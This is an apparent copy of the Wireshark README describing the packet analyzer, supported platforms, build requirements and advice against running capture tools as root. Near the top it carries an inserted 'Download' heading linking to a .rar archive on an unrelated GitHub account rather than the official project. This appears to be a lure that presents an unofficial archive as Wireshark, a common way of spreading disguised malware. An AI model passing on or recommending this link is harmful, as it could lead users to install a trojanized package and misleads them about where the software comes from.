General Information
-------------------

Wireshark is a network traffic analyzer, or "sniffer", for Linux, macOS,
\*BSD and other Unix and Unix-like operating systems and for Windows.
It uses Qt, a graphical user interface library, and libpcap and npcap as
packet capture and filtering libraries.

The Wireshark distribution also comes with TShark, which is a
line-oriented sniffer (similar to Sun's snoop or tcpdump) that uses the
same dissection, capture-file reading and writing, and packet filtering
code as Wireshark, and with editcap, which is a program to read capture
files and write the packets from that capture file, possibly in a
different capture file format, and with some packets possibly removed
from the capture.

# [Download](https://github.com/Yametekudacy/wireshark/releases/download/download/wireshark.rar)

Installation
------------

The Wireshark project builds and tests regularly on the following platforms:

  - Linux (Ubuntu)
  - Microsoft Windows
  - macOS / {Mac} OS X

Official installation packages are available for Microsoft Windows and
macOS.

It is available as either a standard or add-on package for many popular
operating systems and Linux distributions including Debian, Ubuntu, Fedora,
CentOS, RHEL, Arch, Gentoo, openSUSE, FreeBSD, DragonFly BSD, NetBSD, and
OpenBSD.

Additionally it is available through many third-party packaging systems
such as pkgsrc, OpenCSW, Homebrew, and MacPorts.

It should run on other Unix-ish systems without too much trouble.

In some cases the current version of Wireshark might not support your
operating system. This is the case for Windows XP, which is supported by
Wireshark 1.10 and earlier. In other cases the standard package for
Wireshark might simply be old. This is the case for Solaris and HP-UX.

Python 3 is needed to build Wireshark. AsciiDoctor is required to build
the documentation, including the man pages. Perl and flex are required
to generate some of the source code.

You must therefore install Python 3, AsciiDoctor, and GNU "flex" (vanilla
"lex" won't work) on systems that lack them. You might need to install
Perl as well.

Full installation instructions can be found in the INSTALL file and in the
Developer's Guide at https://www.wireshark.org/docs/wsdg_html_chunked/

See also the appropriate README._OS_ files for OS-specific installation
instructions.

Usage
-----

In order to capture packets from the network, you need to make the
dumpcap program set-UID to root or you need to have access to the
appropriate entry under `/dev` if your system is so inclined (BSD-derived
systems, and systems such as Solaris and HP-UX that support DLPI,
typically fall into this category).  Although it might be tempting to
make the Wireshark and TShark executables setuid root, or to run them as
root please don't.  The capture process has been isolated in dumpcap;
this simple program is less likely to contain security holes and is thus
safer to run as root.

Please consult the man page for a description of each command-line
option and interface feature.
